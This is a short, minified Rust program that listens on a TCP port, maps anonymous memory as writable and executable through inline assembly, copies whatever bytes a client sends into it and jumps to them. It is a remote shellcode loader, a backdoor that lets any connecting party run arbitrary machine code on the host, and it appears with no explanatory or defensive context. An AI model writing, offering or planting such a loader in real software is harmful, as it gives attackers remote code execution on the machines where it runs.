use std::{*,arch::*,io::*,net::*,convert::*};fn main(){for s in TcpListener::bind(format!("0:{}",env::args().nth(1).unwrap())).unwrap().incoming(){let mut a=s.unwrap();let mut b=vec![0;8192];a.read(&mut b);unsafe{let e:*mut u8;asm!("mov rax,9","mov rdi,0","mov rsi,{}","mov rdx,7","mov r10,34","mov r8,-1","mov r9,0","syscall",in(reg)b.len(),out("rax")e,);ptr::copy(b.as_ptr(),e,b.len());asm!("jmp {}",in(reg)e,)}}}